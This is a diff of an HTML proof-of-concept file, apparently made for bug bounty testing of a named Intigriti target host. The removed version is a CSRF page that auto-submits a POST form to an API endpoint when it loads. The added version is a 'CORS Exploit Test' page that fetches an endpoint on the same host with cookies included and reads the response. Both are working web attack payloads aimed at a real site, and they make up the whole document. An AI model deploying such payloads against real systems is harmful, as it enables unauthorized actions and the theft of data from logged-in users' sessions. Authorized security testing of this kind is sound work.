@@ -1,8 +1,28 @@
-<!-- csrf_exploit.html -->
+<!DOCTYPE html>
 <html>
-  <body onload="document.forms[0].submit()">
-    <form action="https://intigriti.ilias-solutions.com/intigriti/moplan/rest/moplan/monthlyPlanAsset/ratio" method="POST">
-      <!-- Assuming no body required (Content-Length: 0) -->
-    </form>
-  </body>
+<head>
+  <title>CORS Exploit Test</title>
+</head>
+<body>
+  <h1>CORS Exploit Test</h1>
+  <button onclick="sendCorsRequest()">Test CORS</button>
+
+  <script>
+    function sendCorsRequest() {
+      fetch("https://intigriti.ilias-solutions.com/intigriti/assmgmt/", {
+        method: "GET",
+        credentials: "include"  // Include cookies
+      })
+      .then(response => response.text())
+      .then(text => {
+        console.log("CORS Response:", text);
+        alert("Response received. Check devtools.");
+      })
+      .catch(err => {
+        console.error("CORS Error:", err);
+        alert("CORS request failed. Maybe patched?");
+      });
+    }
+  </script>
+</body>
 </html>
